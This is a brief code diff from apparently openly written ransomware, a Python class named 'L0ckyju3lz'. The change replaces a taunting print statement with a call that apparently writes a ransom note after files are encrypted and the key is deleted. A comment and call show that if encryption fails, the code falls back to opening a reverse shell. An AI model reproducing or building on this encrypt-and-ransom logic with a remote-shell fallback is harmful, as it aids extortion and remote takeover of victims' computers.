@@ -244,7 +244,7 @@ class L0ckyju3lz():
         if self.crypt_file(mode='enc'):
             del self.crypt
             del self.key
-            print("Start crying little baby ...")
+            self.readme_txt()
         else:
             # Okay, encryption fails - lets try to start a reverse shell than ...
             self.reverse_shell()
